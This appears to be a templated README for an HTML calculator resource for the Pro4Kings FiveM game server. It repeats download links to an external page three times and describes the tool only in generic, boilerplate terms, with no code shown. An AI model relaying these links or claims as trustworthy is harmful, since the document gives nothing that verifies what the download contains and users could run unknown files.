# Calculator Pro4Kings v - Game Script Utility 2026

> **HTML-based calculator for the Pro4Kings FiveM server.** Made for use inside the FiveM environment, with an emphasis on fast calculator access and a clean in-browser experience.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandon-reed1994/pro4kings-hub-calculator?style=flat-square)](https://github.com/brandon-reed1994/pro4kings-hub-calculator)

---

<p align="center">
  <a href="https://brandon-reed1994.github.io/pro4kings-hub-calculator/">
    <img src="https://img.shields.io/badge/Download-Calculator%20Pro4Kings%20Script-brightgreen?style=for-the-badge" alt="Download Calculator Pro4Kings Script">
  </a>
</p>

> **[Direct Download - Calculator Pro4Kings](https://brandon-reed1994.github.io/pro4kings-hub-calculator/)**

---

[Download Latest Build](https://brandon-reed1994.github.io/pro4kings-hub-calculator/)

---

## What it is

Calculator Pro4Kings is a calculator utility built as an HTML-based resource for the Pro4Kings FiveM server. Its purpose is to offer a simple interface that fits into the server workflow and keeps interaction direct inside FiveM.

The project is tailored to a specific Romanian server setup and is aimed at users who need a lightweight calculator component instead of a broad toolset. Future changes should mainly preserve compatibility, interface behavior, and the HTML structure used by the script.

## Script Features

- Built for the Pro4Kings FiveM server
- HTML-based implementation
- Calculator-focused utility for server use
- Designed around the FiveM platform
- Lightweight structure for straightforward integration
- Suited to a Romanian server environment
- Simple layout that can be adapted to server needs

## Setup

1. Download the latest build from the release link above.
2. Place the HTML files in the folder used by your FiveM server resource.
3. Make sure the resource path matches your server setup.
4. Start or refresh the resource from your server configuration.

Example structure:

    resources/
      calculator-pro4kings/
        html/
        fxmanifest.lua

If your server uses a different layout, keep the HTML assets in the location expected by the resource.

## Options

Because the project is based on HTML, most configuration is usually handled through the interface itself or by adjusting the resource settings.

| Setting | Purpose | Example |
| --- | --- | --- |
| Server target | Defines the intended deployment | Pro4Kings |
| Platform | Script environment | FiveM |
| Interface type | Front-end format | HTML |
| Resource folder | Local install path | calculator-pro4kings |

If your implementation includes hotkeys or toggles, document them inside the resource files so they match your server version.

## Compatibility

- Target platform: FiveM
- Intended for the Pro4Kings server
- Language/format: HTML
- Best used with the server structure it was built for

Compatibility may vary depending on how the resource is installed and how the server organizes its UI assets. If the folder layout or resource naming changes, update the references accordingly.

## FAQ

**How do I install it?**  
Download the build, copy the HTML assets into the proper FiveM resource folder, and start the resource from your server configuration.

**Can I change the layout?**  
Yes. If you edit the HTML files directly, you can adapt the interface to better fit your server setup.

**Does it need a specific version?**  
It is intended for the Pro4Kings FiveM environment, so the server structure should line up with the expected resource layout.

**How do I update it?**  
Swap the existing files for the newer build and verify that every folder reference still points to the correct location.

**Where should the files be stored?**  
Use the resource directory assigned by your FiveM server, and keep the HTML assets in the folder structure required by the script.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
